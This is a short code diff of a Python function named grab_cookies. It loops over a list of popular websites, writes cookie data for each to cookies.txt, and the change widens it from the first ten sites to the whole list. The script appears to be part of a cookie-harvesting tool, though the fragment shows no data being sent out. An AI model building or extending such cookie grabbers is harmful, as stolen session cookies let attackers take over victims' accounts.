@@ -5,7 +5,7 @@ websites = ['google.com', 'youtube.com', 'facebook.com', 'twitter.com', 'instagr
 def grab_cookies():
     total, done = len(websites), 0
     with open('cookies.txt', 'w') as cookies_save:
-        for website in websites[:10]:
+        for website in websites:
             for prefix in ['http://', 'https://']:
                 cookies_save.write('\n\n' + prefix + website + '\n')
                 try:
